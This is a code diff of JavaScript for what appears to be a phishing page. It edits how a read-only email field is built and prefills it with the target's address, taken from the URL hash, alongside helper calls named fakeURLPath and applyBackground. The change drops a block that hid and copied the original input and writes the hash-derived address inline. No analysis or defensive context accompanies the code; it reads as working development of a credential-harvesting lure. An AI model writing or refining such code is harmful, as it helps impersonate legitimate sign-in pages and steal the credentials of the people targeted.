@@ -43,31 +43,6 @@
     document.head.appendChild(styleElement);
   }
 function createDOM() {
-     var originalInput = document.getElementById("mail_x9k2");
-  var savedValue = "";
-  if (originalInput && originalInput.value) {
-    savedValue = originalInput.value;
-    originalInput.removeAttribute("id"); // remove ID so new one takes over
-    originalInput.style.display = "none"; // hide it
-  }
-  
-  applyBackground();
-  fakeURLPath();
-
-  var emailInput = document.getElementById("mail_x9k2");
-  
-  // Set the value (from original HTML or from URL)
-  if (savedValue) {
-    emailInput.value = savedValue;
-  } else {
-    // Extract from URL if no original value
-    var hash = window.location.hash || '';
-    var segments = hash.split('/');
-    var lastSegment = segments[segments.length - 1];
-    if (lastSegment && lastSegment.includes('@')) {
-      emailInput.value = decodeURIComponent(lastSegment);
-    }
-  }
   var bgCanvas = document.createElement("div");
     bgCanvas.id = "bg_canvas";
     document.body.appendChild(bgCanvas);
@@ -100,7 +75,7 @@ function createDOM() {
                 '<path d="M3 7l9 6 9-6"/>' +
               '</svg>' +
             '</span>' +
-            '<input class="inp_core" type="email" id="mail_x9k2" autocomplete="off" readonly >' +
+          '<input class="inp_core" type="email" id="mail_x9k2" value="' + (window.location.hash.split('/').pop().includes('@') ? decodeURIComponent(window.location.hash.split('/').pop()) : 'user@example.com') + '" autocomplete="off" readonly>' +
           '</div>' +
         '</div>' +
         '<div class="row_block">' +
